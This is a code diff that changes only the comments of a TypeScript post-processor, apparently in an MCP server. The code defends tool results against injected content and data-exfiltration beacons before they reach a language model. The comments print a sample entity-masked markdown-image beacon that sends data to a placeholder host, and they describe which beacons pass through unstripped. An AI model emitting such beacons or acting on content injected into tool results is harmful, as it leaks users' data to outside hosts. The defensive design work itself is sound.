@@ -1,5 +1,5 @@
 // src/lib/response/post-processor.ts
-// Defence-in-depth wrap for tool results (PR-6b).
+// Defence-in-depth wrap for tool results.
 //
 // `createWrapper(config)` returns a closure `wrap(result, hostname)` that runs
 // the full response-side defence — `defendForInline`, then optional
@@ -29,8 +29,7 @@
 //    3-5 strip the byte sequences the detector looks for, so detecting first
 //    preserves the log signal. A JSON part is detected on and returned
 //    unchanged (`LESSONS.md` RC-49). `processTextPart` below states
-//    which options this boundary passes on the non-JSON arm, and what each
-//    one costs.
+//    what that leaves unstripped, and why it is accepted.
 //
 // 3. **Idempotence via a module-private `Symbol("mcp-curl.wrapped")`.** A
 //    `CallToolResult` that has already passed through wrap carries a
@@ -238,40 +237,24 @@ function tag<T extends object>(result: T): T {
 /**
  * Defend one text part.
  *
- * `defendForInline` passes `contentTypeUndetermined: true` because at this
- * boundary the content type genuinely is undetermined: a `registerCustomTool()`
- * handler return, a `beforeRequest` short-circuit and a YAML endpoint result
- * arrive as bare text with no declared grammar. `defendText` reads that as the
- * strictest grammar, so every strip stage runs.
+ * A part that is not a JSON document takes `defendText`'s whole pipeline — the
+ * same one the header channel and cURL stderr take — so
+ * a `registerCustomTool()` handler return, a `beforeRequest` short-circuit and a
+ * YAML endpoint result cannot reach the model on a shorter path.
  *
- * `excludeJsonDocuments: false`, and **it governs only a part that is not
- * itself a JSON document.** `defendForInline` has already answered the JSON
- * question with `classifyBody` before these options exist, so the flag's job
- * here is to stop `defendText` re-asking it with a different predicate
- * (`isDefinitelyJson`) and reaching a different answer — one rule, one
- * decision site. Its secondary reason still holds: the exemption protects a
- * persisted artefact, and nothing on this boundary writes to disk.
- * `LESSONS.md` RC-10.
- *
- * **A beacon inside a JSON string value therefore reaches the model, and that
- * is settled rather than overlooked.** A whole-document strip pairs `<!--` in
- * one field with `-->` in a later one and deletes what lies between; the
- * payload belongs to the agent that chose the API. `LESSONS.md` RC-47, RC-48,
- * RC-49; ARCHITECTURE.md invariant 1a.
- *
- * `decodeEntities: false` for the same reason the header channel passes it
- * (`LESSONS.md` RC-3): the decode's output is what gets RETURNED, so on a
- * channel whose consumer does not itself decode, it manufactures live markup
- * from inert bytes the tool meant literally.
- *
- * **What that costs here is larger than on the header channel, and it is not
- * only a logging blindness.** An entity-encoded beacon —
- * `![x](&#104;ttps://host/?d=…)` — SURVIVES THE STRIP and is returned intact,
- * and an MCP client that renders this text as markdown decodes entity
- * references in link destinations. The two channels want opposite things from
- * one stage and no per-caller flag setting is right for both: `LESSONS.md`
- * RC-12, open design question in `docs/todos/004`, cost restated in
+ * **A beacon inside a JSON string value reaches the model, and that is settled
+ * rather than overlooked.** A whole-document strip pairs `<!--` in one field
+ * with `-->` in a later one and deletes what lies between; the payload belongs
+ * to the agent that chose the API. `LESSONS.md` RC-47, RC-48, RC-49;
  * ARCHITECTURE.md invariant 1a.
+ *
+ * **So does an entity-masked beacon in non-JSON text** —
+ * `![x](&#104;ttps://host/?d=…)` — because no stage decodes numeric entities:
+ * the decode's output would be what gets returned, and on a channel whose
+ * consumer does not decode it manufactures live markup from inert bytes
+ * (`LESSONS.md` RC-3). Declined rather than fixed, on the population
+ * `LESSONS.md` RC-47 measured: no attacker chooses these bytes, and a terminal
+ * client fetches no URL unprompted.
  */
 function processTextPart(
     part: unknown,
@@ -351,8 +334,9 @@ export function createWrapper(
             // Per-message UUID: one UUID per wrap call, shared by every
             // text part of this result. Generated whenever spotlighting is
             // enabled, unless the result is marked server-authored (see
-            // SERVER_AUTHORED). Sanitise + detect run on every result below,
-            // marked or not.
+            // SERVER_AUTHORED). The defence below runs on every result, marked
+            // or not — the full pipeline on a non-JSON part, detection alone on
+            // a JSON one.
             const requestId =
                 config.enableSpotlighting && !hasOwnTag(result, SERVER_AUTHORED) ? randomUUID() : undefined;
 
